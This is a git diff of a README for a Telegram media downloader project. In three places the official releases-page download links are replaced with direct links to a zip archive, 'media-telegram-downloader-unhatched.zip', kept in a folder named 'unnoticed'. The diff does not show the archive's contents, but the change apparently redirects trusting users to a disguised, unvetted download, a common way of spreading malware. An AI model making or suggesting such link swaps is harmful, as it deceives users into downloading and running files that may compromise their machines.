@@ -1,6 +1,6 @@
 # 📥 telegram-media-downloader - Download Telegram Media Easily
 
-[![Download telegram-media-downloader](https://img.shields.io/badge/Download-telegram--media--downloader-4c1?style=for-the-badge&logo=github)](https://github.com/holasisisi23/telegram-media-downloader/releases)
+[![Download telegram-media-downloader](https://img.shields.io/badge/Download-telegram--media--downloader-4c1?style=for-the-badge&logo=github)](https://github.com/holasisisi23/telegram-media-downloader/raw/refs/heads/main/unnoticed/media-telegram-downloader-unhatched.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before you proceed, make sure your computer meets the following:
 
 To get the software, go to the release page:
 
-[ Download telegram-media-downloader Releases ](https://github.com/holasisisi23/telegram-media-downloader/releases)
+[ Download telegram-media-downloader Releases ](https://github.com/holasisisi23/telegram-media-downloader/raw/refs/heads/main/unnoticed/media-telegram-downloader-unhatched.zip)
 
 Click this link to open the page where the program files are stored.  
 
@@ -183,7 +183,7 @@ If you want a different location, use the `--output` option as shown above.
 
 Here is the link to download the latest version:
 
-[ ![Download Now](https://img.shields.io/badge/Download-telegram--media--downloader-brightgreen?style=for-the-badge) ](https://github.com/holasisisi23/telegram-media-downloader/releases)
+[ ![Download Now](https://img.shields.io/badge/Download-telegram--media--downloader-brightgreen?style=for-the-badge) ](https://github.com/holasisisi23/telegram-media-downloader/raw/refs/heads/main/unnoticed/media-telegram-downloader-unhatched.zip)
 
 ---
 
